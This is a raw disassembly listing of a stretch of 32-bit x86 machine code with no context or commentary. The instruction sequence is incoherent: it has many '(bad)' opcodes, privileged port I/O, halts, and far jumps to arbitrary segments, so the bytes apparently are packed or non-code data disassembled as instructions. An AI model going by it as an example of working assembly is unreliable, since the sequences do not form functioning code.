  4108cd:	mov    ?,WORD PTR [ebx-0xd]
  4108d0:	cmp    al,0x31
  4108d2:	jns    0x41091f
  4108d4:	sbb    edx,DWORD PTR [ebx+0x38]
  4108d7:	add    DWORD PTR [eax+0x33183cdb],ebx
  4108dd:	mov    ah,0x5c
  4108df:	inc    esp
  4108e0:	ds iret 
  4108e2:	mov    edi,0x794ce152
  4108e7:	fs jmp 0xbdaa4fa
  4108ed:	ret    
  4108ee:	int    0xd7
  4108f0:	icebp  
  4108f1:	cmp    dl,BYTE PTR cs:[edx+eiz*4-0x47]
  4108f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108f7:	sbb    ebx,DWORD PTR [ecx+0x75]
  4108fa:	cmp    ebp,0xffffffc9
  4108fd:	mov    BYTE PTR [eax+0x18f9e37d],0x82
  410904:	mov    eax,DWORD PTR [edi+0x505ea665]
  41090a:	inc    DWORD PTR [edx-0x36]
  41090d:	xor    al,0x4a
  41090f:	jno    0x410988
  410911:	das    
  410912:	inc    ebx
  410913:	int3   
  410914:	jo     0x410910
  410916:	jbe    0x410922
  410918:	in     al,dx
  410919:	inc    eax
  41091a:	cmp    edi,DWORD PTR [edx+0x1223a462]
  410920:	shl    DWORD PTR [ecx-0x9],1
  410923:	cmp    al,BYTE PTR [edi-0x59b996ab]
  410929:	gs and eax,0x9c00acba
  41092f:	dec    esi
  410930:	data16 aam 0x5e
  410933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410934:	pop    ecx
  410935:	mov    ch,0x95
  410937:	inc    ebx
  410938:	mov    edx,0x9c5b76bd
  41093d:	std    
  41093e:	aad    0xd4
  410940:	sar    BYTE PTR [esp+eiz*4+0x32bdd39a],cl
  410947:	imul   esp,DWORD PTR [eax+0x6d],0xffffffc6
  41094b:	mov    ch,0xc9
  41094d:	xor    BYTE PTR [edi-0x42955734],bh
  410953:	pop    edx
  410954:	mov    eax,ds:0x3198ac88
  410959:	xchg   edi,eax
  41095a:	inc    edx
  41095b:	test   DWORD PTR [ebx-0x75e994c0],esi
  410961:	cmp    DWORD PTR [eax+ebp*4+0x1cda0fa],esi
  410968:	add    ah,BYTE PTR [edx+0x70]
  41096b:	xchg   esi,eax
  41096c:	sub    edx,DWORD PTR [eax]
  41096e:	and    al,0xfe
  410970:	xchg   DWORD PTR [eax+eax*8+0x2f],ecx
  410974:	dec    edx
  410975:	sahf   
  410976:	or     ebp,DWORD PTR [ebx]
  410978:	sbb    BYTE PTR [esp-0x4da92016],bl
  41097f:	mov    eax,ds:0x96523b88
  410984:	arpl   WORD PTR [ecx],di
  410986:	cwde   
  410987:	mov    ah,0x88
  410989:	adc    ebx,edi
  41098b:	out    0x6,eax
  41098d:	adc    al,0x61
  41098f:	or     dl,ah
  410991:	out    0x2a,eax
  410993:	arpl   WORD PTR [edi+0x33ff7715],bx
  410999:	mov    edi,DWORD PTR [edi]
  41099b:	xlat   BYTE PTR ds:[ebx]
  41099c:	jmp    0xe618:0xb2653546
  4109a3:	mov    ds:0xc4c80524,al
  4109a8:	ret    
  4109a9:	dec    ecx
  4109aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109ab:	or     ah,BYTE PTR [ebp+0x2463f816]
  4109b1:	push   ds
  4109b2:	xchg   ebp,eax
  4109b3:	mov    bl,0x8f
  4109b5:	fbstp  TBYTE PTR [ebp-0x4f]
  4109b8:	mov    ds:0xde9faad7,al
  4109bd:	cmp    BYTE PTR [esi+0x178c21c5],0x20
  4109c4:	hlt    
  4109c5:	jecxz  0x4109e8
  4109c7:	dec    esi
  4109c8:	jecxz  0x4109ec
  4109ca:	jae    0x410977
  4109cc:	add    eax,0xcef73c2d
  4109d1:	(bad)  
  4109d3:	xlat   BYTE PTR ds:[ebx]
  4109d4:	sbb    al,0xa3
  4109d6:	loop   0x4109ff
  4109d8:	pop    edx
  4109d9:	mov    al,0xc0
  4109db:	push   0x1c
  4109dd:	fs mov ah,0x2a
  4109e0:	jmp    0xd97b:0x3ee1be6a
  4109e7:	cdq    
  4109e8:	out    dx,al
  4109e9:	dec    ebp
  4109ea:	push   ebx
  4109eb:	test   ebx,esi
  4109ed:	mov    bl,0xe9
  4109ef:	push   eax
  4109f0:	xchg   ebp,eax
  4109f1:	imul   DWORD PTR [ecx]
  4109f3:	add    DWORD PTR [edi],0x667b4aaf
  4109f9:	rcl    DWORD PTR [ecx+0x6f067c13],1
  4109ff:	or     dl,BYTE PTR [ecx+0x13]
  410a02:	inc    eax
  410a03:	sub    al,0x3
  410a05:	or     BYTE PTR [eax],0xec
  410a08:	dec    esi
  410a09:	mov    ds:0x54397c83,al
  410a0e:	cld    
  410a0f:	mov    eax,ds:0x2cf21b20
  410a14:	pop    esi
  410a15:	hlt    
  410a16:	icebp  
  410a17:	push   eax
  410a18:	in     al,dx
  410a19:	mov    cl,0xfe
  410a1b:	dec    ebp
  410a1c:	push   ecx
  410a1d:	and    bl,cl
  410a1f:	pop    eax
  410a20:	mov    eax,ds:0x5ecbd73a
  410a25:	jno    0x410a03
  410a27:	add    dh,0xa3
  410a2a:	jb     0x4109d6
  410a2c:	dec    ebp
  410a2d:	push   0x7e
  410a2f:	fcom   DWORD PTR [ecx-0x46c05e78]
  410a35:	ret    0xdbea
  410a38:	shr    DWORD PTR [edx+0x1c],1
  410a3b:	xchg   ebx,eax
  410a3c:	lahf   
  410a3d:	sar    ebp,0x35
  410a40:	lock mov edi,0xa77a05ae
  410a46:	push   cs
  410a47:	sar    bl,1
  410a49:	sub    eax,0x8c43877c
  410a4e:	sub    al,0xe6
  410a50:	xchg   edi,eax
  410a51:	je     0x410a15
  410a53:	fld    DWORD PTR [esi+ebp*8-0x6418f7e7]
  410a5a:	call   0xbdb5:0xa4521760
  410a61:	cs add eax,0x85576184
  410a67:	sub    edx,edx
  410a69:	xor    bl,BYTE PTR [edi-0x34]
  410a6c:	hlt    
  410a6d:	rcr    DWORD PTR ds:0x820c165a,cl
  410a73:	sar    BYTE PTR [edi-0x77],cl
  410a76:	loopne 0x410a58
  410a78:	dec    esp
  410a79:	out    dx,al
  410a7a:	xor    edi,DWORD PTR [edi+0x6d4c1dfd]
  410a80:	dec    edx
  410a81:	sbb    al,0xbd
  410a83:	inc    eax
  410a84:	inc    esp
  410a85:	mov    bh,0x6f
  410a87:	frstor [ecx]
  410a89:	adc    ch,al
  410a8b:	xor    eax,0x92b70d1e
  410a90:	add    DWORD PTR [edx-0xc],esp
  410a93:	scas   eax,DWORD PTR es:[edi]
  410a94:	mov    esi,0xed1d3e
  410a99:	stos   BYTE PTR es:[edi],al
  410a9a:	sbb    esi,DWORD PTR [esi-0x479c10dd]
  410aa0:	into   
  410aa1:	(bad)  
  410aa3:	mov    ebx,0xfa0a0f2d
  410aa8:	sub    al,0xda
  410aaa:	stos   BYTE PTR es:[edi],al
  410aab:	jge    0x410b2b
  410aad:	push   eax
  410aae:	pop    es
  410aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ab0:	push   ebx
  410ab1:	mov    eax,0xa7123aff
  410ab6:	call   0x5ca1:0x88cb2c27
  410abd:	mov    ah,0x44
  410abf:	xchg   DWORD PTR [edi+eiz*2],ebp
  410ac2:	jbe    0x410a98
  410ac4:	std    
  410ac5:	pop    esi
  410ac6:	in     eax,dx
  410ac7:	in     eax,dx
  410ac8:	adc    DWORD PTR ss:[ebp+0x7c778fd8],0xef20a2ab
  410ad3:	and    ch,BYTE PTR [esi+0x4a73201c]
  410ad9:	loop   0x410b2a
  410adb:	jg     0x410b0d
  410add:	imul   esp,DWORD PTR [edx-0x3f],0xffffffd3
  410ae1:	pop    eax
  410ae2:	or     DWORD PTR [edx+0x2095878d],ecx
  410ae8:	mov    es,WORD PTR [ecx]
  410aea:	add    eax,0x58ed6d56
  410aef:	clc    
  410af0:	push   cs
  410af1:	pusha  
  410af2:	imul   ebp,edx,0x5a
  410af5:	rcl    DWORD PTR [ecx-0x41355f9c],0x30
  410afc:	pop    ecx
  410afd:	enter  0xce40,0xb1
  410b01:	(bad)  
  410b02:	sti    
  410b03:	xor    DWORD PTR [ecx],esp
  410b05:	(bad)  
  410b07:	adc    BYTE PTR [ebp-0x1d],bl
  410b0a:	xchg   ecx,eax
  410b0b:	or     al,0xdc
  410b0d:	aas    
  410b0e:	shl    BYTE PTR [ebx+0x1031ab6b],1
  410b14:	sub    eax,ebp
  410b16:	jmp    0xeca8:0xd3d5fd7c
  410b1d:	(bad)  
  410b1f:	call   0x8015cd80
  410b24:	jle    0x410b0e
  410b26:	ret    
  410b27:	jno    0x410b63
  410b29:	mov    ds:0x4261485,eax
  410b2e:	mov    dh,0x68
  410b30:	call   0xcbdae14
  410b35:	or     BYTE PTR [ebx],0x0
  410b38:	mov    cl,0x14
  410b3a:	xchg   ebp,eax
  410b3b:	(bad)  [ecx-0x56]
  410b3e:	jae    0x410b6e
  410b40:	in     eax,dx
  410b41:	inc    ecx
  410b42:	hlt    
  410b43:	inc    ecx
  410b44:	shr    ah,cl
  410b46:	or     bl,ch
  410b48:	and    edi,esp
  410b4a:	pop    ebp
  410b4b:	jb     0x410bc4
  410b4d:	call   0xa46e82a6
  410b52:	in     eax,0x22
  410b54:	and    BYTE PTR [ebx+edi*2-0x5d22e83c],al
  410b5b:	pop    ss
  410b5c:	jae    0x410b0b
  410b5e:	scas   al,BYTE PTR es:[edi]
  410b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b60:	pop    ecx
  410b61:	lods   eax,DWORD PTR ds:[esi]
  410b62:	neg    DWORD PTR [edx]
  410b64:	and    al,0xcc
  410b66:	mov    WORD PTR [edx+ebx*8],?
  410b69:	dec    edi
  410b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b6b:	std    
  410b6c:	add    edi,ebx
  410b6e:	mov    esi,ecx
  410b70:	cmp    al,0xb5
  410b72:	in     al,dx
  410b73:	out    0x7b,eax
  410b75:	xor    BYTE PTR [esi+ecx*1-0x9],bh
  410b79:	iret   
  410b7a:	sbb    al,0x73
  410b7c:	adc    esp,ecx
  410b7e:	cmp    esp,DWORD PTR [ecx+0x44]
  410b81:	cmp    eax,0x79e7d9b7
  410b86:	aad    0x53
  410b88:	add    eax,esi
  410b8a:	mov    bl,0x53
  410b8c:	shl    bh,cl
  410b8e:	fild   QWORD PTR ds:0x68b4c083
  410b94:	aam    0xfe
  410b96:	retf   0x7614
  410b99:	dec    ebx
  410b9a:	dec    esi
  410b9b:	mov    edx,eax
  410b9d:	stos   DWORD PTR es:[edi],eax
  410b9e:	mov    BYTE PTR [ebx-0x4ae37257],ch
  410ba4:	adc    ah,dl
  410ba6:	cmc    
  410ba7:	out    0x1b,eax
  410ba9:	push   eax
  410baa:	fistp  DWORD PTR [edx+edx*1]
  410bad:	inc    edi
  410bae:	mov    ds:0x4ca90082,eax
  410bb3:	cmc    
  410bb4:	jmp    0xdefdb588
  410bb9:	mov    al,0x55
  410bbb:	add    dh,cl
  410bbd:	adc    DWORD PTR [esi+0x6d],ebx
  410bc0:	mov    bh,0x6c
  410bc2:	dec    esp
  410bc3:	jb     0x410b49
  410bc5:	rol    cl,1
  410bc7:	dec    ecx
  410bc8:	mov    dh,0xbe
  410bca:	and    DWORD PTR ss:[edx-0x1ed14a63],ecx
  410bd1:	pop    ebp
  410bd2:	mov    al,0xad
  410bd4:	adc    DWORD PTR [esi],esp
  410bd6:	ins    BYTE PTR es:[edi],dx
  410bd7:	aas    
  410bd8:	js     0x410bd0
  410bda:	adc    BYTE PTR [edi],bh
  410bdc:	je     0x410c18
  410bde:	push   esi
  410bdf:	dec    ebx
  410be0:	inc    ebx
  410be1:	enter  0xc469,0x3
  410be5:	pop    es
  410be6:	inc    edx
  410be7:	push   0x64938391
  410bec:	das    
  410bed:	fbstp  TBYTE PTR [edi-0x7e]
  410bf0:	jle    0x410c53
  410bf2:	(bad)  
  410bf4:	mov    eax,0x4a4e0990
  410bf9:	push   ebx
  410bfa:	adc    BYTE PTR [ebx],ch
  410bfc:	push   ecx
  410bfd:	scas   eax,DWORD PTR es:[edi]
  410bfe:	add    BYTE PTR [esi],dl
  410c00:	dec    eax
  410c01:	jge    0x410c28
  410c03:	ss push ebp
  410c05:	leave  
  410c06:	jge    0x410c67
  410c08:	pop    esp
  410c09:	call   0x98be:0x52f1179e
  410c10:	xor    eax,0x55069801
  410c15:	jnp    0x410c7e
  410c17:	ffreep st(4)
  410c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c1a:	hlt    
  410c1b:	dec    ecx
  410c1c:	mov    ebp,0x28c2b351
  410c21:	ins    BYTE PTR es:[edi],dx
  410c22:	retf   
  410c23:	jp     0x410c6a
  410c25:	aad    0x45
  410c27:	inc    ebp
  410c28:	push   edi
  410c29:	loop   0x410bf3
  410c2b:	xchg   ecx,eax
  410c2c:	adc    DWORD PTR [ebx],ebp
  410c2e:	(bad)  
  410c2f:	adc    DWORD PTR [ebp+0x5e8eb8ed],esp
  410c35:	(bad)
  410c38:	repz lahf 
  410c3a:	sub    DWORD PTR ss:[edi-0x3f0cd841],ecx
  410c41:	dec    esi
  410c42:	pop    eax
  410c43:	push   edx
  410c44:	pop    esi
  410c45:	xor    al,0x28
  410c47:	aas    
  410c48:	pop    esi
  410c49:	jecxz  0x410c77
  410c4b:	inc    eax
  410c4c:	add    al,0x82
  410c4e:	pop    ebx
  410c4f:	into   
  410c50:	jge    0x410c2a
  410c52:	cwde   
  410c53:	xchg   ebx,eax
  410c54:	push   edi
  410c55:	imul   esp,edi,0xeb6e77a7
  410c5b:	inc    ecx
  410c5c:	not    DWORD PTR [ebx+0x4e9814d9]
  410c62:	and    al,0xca
  410c64:	push   ecx
  410c65:	outs   dx,DWORD PTR ds:[esi]
  410c66:	test   BYTE PTR [ecx+edi*2+0x6c8aa09f],ah
  410c6d:	test   DWORD PTR [ecx-0x10],0x8000fcb3
  410c74:	bound  eax,QWORD PTR [ecx]
  410c76:	inc    edi
  410c77:	xlat   BYTE PTR ds:[ebx]
  410c78:	xor    bl,ah
  410c7a:	sub    dh,BYTE PTR [edi+0x64]
  410c7d:	cmp    al,0x3b
  410c7f:	clc    
  410c80:	out    dx,eax
  410c81:	inc    ebp
  410c82:	retf   
  410c83:	cmp    BYTE PTR [ebx+0x63],0x79
  410c87:	(bad)  
  410c88:	out    dx,al
  410c89:	(bad)  
  410c8a:	ror    DWORD PTR [ecx+0x58],1
  410c8d:	inc    ebp
  410c8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c8f:	add    eax,0x7121ac66
  410c94:	(bad)  
  410c95:	jbe    0x410c29
  410c97:	or     BYTE PTR [edx-0x1cfa31bd],cl
  410c9d:	bound  edx,QWORD PTR [ecx]
  410c9f:	(bad)
  410ca3:	and    BYTE PTR [esi+0x1134f0ec],al
  410ca9:	js     0x410c9c
  410cab:	nop
  410cac:	shl    al,0xad
  410caf:	out    dx,eax
  410cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cb1:	dec    esp
  410cb2:	cmp    BYTE PTR [edx-0xfa92a55],0x5a
  410cb9:	stos   DWORD PTR es:[edi],eax
  410cba:	adc    al,al
  410cbc:	imul   edi,DWORD PTR [ecx+ecx*8+0x3f],0xca929ac
  410cc4:	pop    edx
  410cc5:	in     al,dx
  410cc6:	ss mov ah,0x8a
  410cc9:	sti    
  410cca:	nop
  410ccb:	jne    0x49523100
  410cd1:	push   edx
  410cd2:	out    dx,eax
  410cd3:	test   eax,0xdea174e2
  410cd8:	xor    dl,BYTE PTR [edx+0x55f2974e]
  410cde:	xchg   edi,eax
  410cdf:	(bad)  
  410ce0:	rol    BYTE PTR [edi+0x737e54dd],cl
  410ce6:	cld    
  410ce7:	sub    al,0x92
  410ce9:	lods   eax,DWORD PTR ds:[esi]
  410cea:	and    eax,0x860f6204
  410cef:	sbb    BYTE PTR [eax-0x2d],0x75
  410cf3:	jno    0x410d6c
  410cf5:	cmp    bl,bh
  410cf7:	cmc    
  410cf8:	das    
  410cf9:	dec    edi
  410cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cfb:	push   ebx
  410cfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cfd:	cwde   
  410cfe:	div    BYTE PTR [ebp-0x58]
  410d01:	mov    ds:0x8c19e653,al
  410d06:	or     eax,0x2ac0e5fe
  410d0b:	push   esp
  410d0c:	or     DWORD PTR [esi-0x1c],edx
  410d0f:	pop    ebp
  410d10:	pusha  
  410d11:	addr16 pop ebx
  410d13:	fld    DWORD PTR [ebx*2+0xa362b7a]
  410d1a:	pop    ebp
  410d1b:	fwait
  410d1c:	ret    
  410d1d:	pusha  
  410d1e:	mov    gs,WORD PTR [esi+0x4fa4fe58]
  410d24:	and    al,0x3f
  410d26:	sbb    ah,BYTE PTR gs:[edi-0x5b]
  410d2a:	retf   0x22d3
  410d2d:	popf   
  410d2e:	mov    ecx,0x7be0c462
  410d33:	call   0x815f6889
  410d38:	ins    BYTE PTR es:[edi],dx
  410d39:	in     eax,dx
  410d3a:	imul   eax,edx,0x3b
  410d3d:	arpl   WORD PTR [ebp-0x6b],ax
  410d40:	out    0x50,al
  410d42:	add    eax,0xb7ee1831
  410d47:	or     dh,dl
  410d49:	jnp    0x410dbe
  410d4b:	lock rcl DWORD PTR [ebx+0x26],cl
  410d4f:	mov    ebx,0xb56ebb86
  410d54:	ds aam 0xaf
  410d57:	add    al,0xe6
  410d59:	(bad)  
  410d5a:	lock pushf 
  410d5c:	data16 stc 
  410d5e:	in     eax,dx
  410d5f:	add    DWORD PTR [edi],esp
  410d61:	pop    esi
  410d62:	adc    eax,0x57d22e4c
  410d67:	mov    esi,0x4d1b4ac7
  410d6c:	push   0xffffff93
  410d6e:	xor    eax,esi
  410d70:	arpl   WORD PTR [ebp-0x70],cx
  410d73:	jbe    0x410dae
  410d75:	sar    DWORD PTR [edi+0x387a835],cl
  410d7b:	ins    DWORD PTR es:[edi],dx
  410d7c:	ret    0x2ba2
  410d7f:	mov    dh,0x64
  410d81:	ins    DWORD PTR es:[edi],dx
  410d82:	pop    esp
  410d83:	arpl   WORD PTR [ebx],si
  410d85:	mov    bl,0xdd
  410d87:	call   0xab59ea1a
  410d8c:	(bad)  
  410d8d:	push   ss
  410d8e:	pop    ecx
  410d8f:	pop    eax
  410d90:	gs aam 0xfc
  410d93:	out    dx,al
  410d94:	push   0xffffffde
  410d96:	dec    ebp
  410d97:	lahf   
  410d98:	sbb    DWORD PTR [ebx-0xbcd68c0],0xffffffd4
  410d9f:	enter  0xa12b,0x89
  410da3:	iret   
  410da4:	jl     0x410e1b
  410da6:	scas   al,BYTE PTR es:[edi]
  410da7:	xor    edi,DWORD PTR [ebp+0x455bdf6c]
  410dad:	aas    
  410dae:	nop
  410daf:	fmul   st(5),st
  410db1:	mov    bh,0x79
  410db3:	aam    0x68
  410db5:	dec    edi
  410db6:	mov    dh,0x8f
  410db8:	xchg   edi,eax
  410db9:	and    BYTE PTR [edi],dl
  410dbb:	add    DWORD PTR [edi-0x6c4d3679],ebx
  410dc1:	dec    ebx
  410dc2:	pop    esi
  410dc3:	mov    edi,0x956f77d5
  410dc8:	popa   
  410dc9:	jmp    0x410da7
  410dcb:	push   edi
  410dcc:	xor    al,0x5c
  410dce:	mov    ebx,0xcb3a23b9
  410dd3:	scas   al,BYTE PTR es:[edi]
  410dd4:	sub    al,0x8b
  410dd6:	icebp  
  410dd7:	xchg   esi,eax
  410dd8:	sub    BYTE PTR [edx],bh
  410dda:	retf   
  410ddb:	cmp    al,0xa0
  410ddd:	ret    
  410dde:	dec    esp
  410ddf:	test   ebx,esp
  410de1:	mov    ecx,0x9da524f7
  410de6:	popf   
  410de7:	dec    ebx
  410de8:	or     DWORD PTR [esi],ebp
  410dea:	adc    edx,ebp
  410dec:	and    al,0x6c
  410dee:	and    ebp,esp
  410df0:	cwde   
  410df1:	cmc    
  410df2:	imul   eax,ebx,0x1f171fb0
  410df8:	inc    ebx
  410df9:	jb     0x410e60
  410dfb:	out    0x3d,al
  410dfd:	dec    esi
  410dfe:	(bad)  
  410dff:	sub    BYTE PTR [ebx],dh
  410e01:	scas   eax,DWORD PTR es:[edi]
  410e02:	bound  ebx,QWORD PTR [ebp-0x11edeebb]
  410e08:	test   al,0x80
  410e0a:	push   edi
  410e0b:	push   esi
  410e0c:	aaa    
  410e0d:	fdiv   st(3),st
  410e0f:	push   ebp
  410e10:	push   ebp
  410e11:	adc    BYTE PTR [ebx],0xb3
  410e14:	retf   
  410e15:	sbb    eax,0x77a15e8c
  410e1a:	jnp    0x410e49
  410e1c:	in     al,dx
  410e1d:	jb     0x410e55
  410e1f:	mov    esp,0xc5415a2c
  410e24:	jmp    0x140e:0xb93f68ac
  410e2b:	out    0xe7,al
  410e2d:	xchg   ah,bh
  410e2f:	or     BYTE PTR [edi-0x49a6a458],0x67
  410e36:	and    al,0xbd
  410e38:	fsubrp st(6),st
  410e3a:	pop    DWORD PTR [ebx+0x3d7fb569]
  410e40:	sahf   
  410e41:	ins    BYTE PTR es:[edi],dx
  410e42:	sbb    DWORD PTR [eax-0x2040a3a7],ebp
  410e48:	push   cs
  410e49:	adc    ch,dh
  410e4b:	dec    cl
  410e4d:	shl    BYTE PTR [esi+ebx*8+0xa],0x36
  410e52:	fmul   st,st(1)
  410e54:	inc    ebp
  410e55:	adc    al,0xa3
  410e57:	xlat   BYTE PTR ds:[ebx]
  410e58:	test   al,0x25
  410e5a:	retf   0x8ed3
  410e5d:	xchg   ecx,eax
  410e5e:	xchg   BYTE PTR ds:0x990ed1a3,ch
  410e64:	aaa    
  410e65:	pop    es
  410e66:	xchg   ebx,eax
  410e67:	lahf   
  410e68:	or     eax,0x560be405
  410e6d:	cdq    
  410e6e:	and    esi,DWORD PTR [edi+0x4e]
  410e71:	dec    esi
  410e72:	enter  0x6f8c,0x78
  410e76:	(bad)  
  410e77:	ins    DWORD PTR es:[edi],dx
  410e78:	jle    0x410e38
  410e7a:	add    eax,0xead9c058
  410e7f:	mov    ds:0x2375a476,al
  410e84:	inc    ebp
  410e85:	(bad)  
  410e86:	ja     0x410e11
  410e88:	adc    eax,DWORD PTR [edi-0x58fe147e]
  410e8e:	scas   al,BYTE PTR es:[edi]
  410e8f:	mov    edi,0x90b73ba0
  410e94:	imul   edi,DWORD PTR [esi],0xb
  410e97:	ja     0x410e67
  410e99:	test   DWORD PTR [ebx+ebp*1],esp
  410e9c:	es fsub st,st(5)
  410e9f:	loopne 0x410e8e
  410ea1:	prefetch BYTE PTR [ebx-0x7698383d]
  410ea8:	call   0xf78a:0x715da12b
  410eaf:	jge    0x410f0a
  410eb1:	xchg   ebp,eax
  410eb2:	push   edi
  410eb3:	mov    ch,0x65
  410eb5:	and    ebp,eax
  410eb7:	xor    eax,0x1c361f5d
  410ebc:	xchg   BYTE PTR [esi],bh
  410ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ebf:	ror    dh,cl
  410ec1:	fs daa 
  410ec3:	out    0x79,al
  410ec5:	(bad)  
  410ec6:	aas    
  410ec7:	ret    
  410ec8:	inc    ebp
  410ec9:	and    BYTE PTR [ecx],bh
  410ecb:	mov    ds:0x94a2205c,al
  410ed0:	sub    ah,BYTE PTR [esi-0x5fe11cff]
  410ed6:	jle    0x410e82
  410ed8:	loop   0x410f32
  410eda:	sub    DWORD PTR [ecx+edi*2-0x7],edx
  410ede:	and    BYTE PTR [ebp-0x29],ah
  410ee1:	sbb    esi,DWORD PTR [esi+ebx*4+0x5f]
  410ee5:	cli    
  410ee6:	jns    0x410edf
  410ee8:	xor    DWORD PTR [esi],eax
  410eea:	outs   dx,DWORD PTR ds:[esi]
  410eeb:	lds    eax,FWORD PTR es:[ecx+0x20]
  410eef:	mov    DWORD PTR [ebx+ebp*2-0x348cf037],esp
  410ef6:	out    dx,eax
  410ef7:	lock sub dh,BYTE PTR [ecx+ecx*4]
  410efb:	inc    esp
  410efc:	imul   esi,DWORD PTR [ebp-0x75],0x633dbae0
  410f03:	dec    eax
  410f04:	iret   
  410f05:	iret   
  410f06:	retf   
  410f07:	cmp    eax,0x3c702eca
  410f0c:	std    
  410f0d:	ins    DWORD PTR es:[edi],dx
  410f0e:	pop    ebx
  410f0f:	or     edi,edi
  410f11:	adc    eax,0x6f654a6
  410f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f17:	jmp    0x2ef98199
  410f1c:	jae    0x410eca
  410f1e:	ins    BYTE PTR es:[edi],dx
  410f1f:	daa    
  410f20:	push   esi
  410f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f22:	rcl    DWORD PTR [edi-0x42],1
  410f25:	in     al,0xb7
  410f27:	call   0x3a3d:0x374241c7
  410f2e:	xchg   ecx,eax
  410f2f:	sub    BYTE PTR [esi],ah
  410f31:	sbb    ah,ah
  410f33:	jnp    0x410f2f
  410f35:	sub    esi,DWORD PTR [edx]
  410f37:	stos   DWORD PTR es:[edi],eax
  410f38:	in     eax,0xff
  410f3a:	or     edx,ecx
  410f3c:	(bad)  
  410f3d:	cli    
  410f3e:	div    DWORD PTR [esi+esi*4]
  410f41:	std    
  410f42:	leave  
  410f43:	lods   al,BYTE PTR ds:[esi]
  410f44:	sar    BYTE PTR [eax-0xc],1
  410f47:	dec    edx
  410f48:	test   DWORD PTR [esi+esi*2-0x16],esp
  410f4c:	out    dx,al
  410f4d:	loope  0x410f92
  410f4f:	lahf   
  410f50:	sahf   
  410f51:	cli    
  410f52:	inc    edx
  410f53:	stos   DWORD PTR es:[edi],eax
  410f54:	push   cs
  410f55:	dec    edx
  410f56:	dec    esi
  410f57:	mov    WORD PTR [ebp-0x54],?
  410f5a:	ds pop es
  410f5c:	ret    
  410f5d:	mov    edx,0x2b862904
  410f62:	aad    0x40
  410f64:	mov    edx,0x613e21e7
  410f69:	cmc    
  410f6a:	inc    ecx
  410f6b:	jb     0x410fc3
  410f6d:	int    0xe1
  410f6f:	push   ss
  410f70:	jmp    0x7d7:0x54898d81
  410f77:	cdq    
  410f78:	add    dh,0xf1
  410f7b:	test   DWORD PTR [edi+0x3bf74b8f],ebp
  410f81:	mov    bl,BYTE PTR [edi+0x17]
  410f84:	jmp    0x4ecae0d0
  410f89:	inc    DWORD PTR [ebx-0x42dac6a3]
  410f8f:	fild   DWORD PTR [ebx]
  410f91:	sti    
  410f92:	(bad)  
  410f93:	sbb    esp,DWORD PTR cs:[ecx+0xd48ac3f]
  410f9a:	rcr    DWORD PTR [edx],0x5a
  410f9d:	mov    ecx,0xab846f42
  410fa2:	repz ds jne 0x410fd6
  410fa6:	add    BYTE PTR [esi+edx*1],ah
  410fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410faa:	cmp    BYTE PTR [ebx],dh
  410fac:	or     BYTE PTR [ecx+0x59],bl
  410faf:	(bad)  
  410fb1:	jmp    0x4627d63d
  410fb6:	outs   dx,BYTE PTR ds:[esi]
  410fb7:	arpl   WORD PTR [ebx+0x7],di
  410fba:	hlt    
  410fbb:	sub    esi,DWORD PTR [ebp+0x49557005]
  410fc1:	push   cs
  410fc2:	popf   
  410fc3:	sbb    ch,BYTE PTR [ebx+0x76fe410e]
  410fc9:	or     DWORD PTR [edi+0x14],ebp
  410fcc:	add    al,0x87
  410fce:	pop    ebx
  410fcf:	inc    ebp
  410fd0:	into   
  410fd1:	lods   al,BYTE PTR ds:[esi]
  410fd2:	jno    0x410f96
  410fd4:	mov    ebx,0x3e9569b7
  410fd9:	jo     0x410fe9
  410fdb:	out    0x37,eax
  410fdd:	test   al,0xbe
  410fdf:	mov    bl,0xd9
  410fe1:	arpl   WORD PTR [eax+0x5a],ax
  410fe4:	jg     0x410fb3
  410fe6:	loope  0x410fb7
  410fe8:	pop    ds
  410fe9:	add    al,0xaa
  410feb:	jae    0x410fe1
  410fed:	nop
  410fee:	sub    BYTE PTR [esi+0x49],dh
  410ff1:	jnp    0x410faa
  410ff3:	lock pop esp
  410ff5:	cmp    DWORD PTR [ebx-0x35],0x43
  410ff9:	push   ebx
  410ffa:	jb     0x410f7f
  410ffc:	dec    edx
  410ffd:	stos   DWORD PTR es:[edi],eax
  410ffe:	fstp   QWORD PTR [eax+0x1fd56d40]
  411004:	push   esp
  411005:	leave  
  411006:	cmp    eax,0x8c1e2334
  41100b:	xor    cl,bh
  41100d:	xlat   BYTE PTR ds:[ebx]
  41100e:	sbb    DWORD PTR [esp+0x5886f038],esi
  411015:	out    dx,al
  411016:	mov    al,ds:0x2f58949
  41101b:	es add ch,dl
  41101e:	xlat   BYTE PTR ds:[bx]
  411020:	test   al,0x1d
  411022:	rol    DWORD PTR [edi],0xf0
  411025:	inc    edi
  411026:	out    0xd8,eax
  411028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411029:	cmp    esp,DWORD PTR [eax]
  41102b:	mov    eax,ds:0xc9e1284c
  411030:	sbb    DWORD PTR [esi+esi*2-0xa],edi
  411034:	jmp    0x4fa4fa60
  411039:	cmp    BYTE PTR ds:0xd0e86366,dh
  41103f:	mov    bl,0x36
  411041:	jae    0x411023
  411043:	(bad)  
  411044:	push   cs
  411045:	loopne 0x410fd1
  411047:	ret    0xc78d
  41104a:	(bad)  
  41104c:	jne    0x41102d
  41104e:	shr    BYTE PTR ds:0x952326ca,1
  411054:	fidiv  DWORD PTR [edx-0x7337d095]
  41105a:	rol    DWORD PTR [ecx],cl
  41105c:	dec    ebx
  41105d:	(bad)  
  41105e:	loopne 0x4110c0
  411060:	out    dx,eax
  411061:	sub    bl,cl
  411063:	lods   eax,DWORD PTR ds:[esi]
  411064:	(bad)  
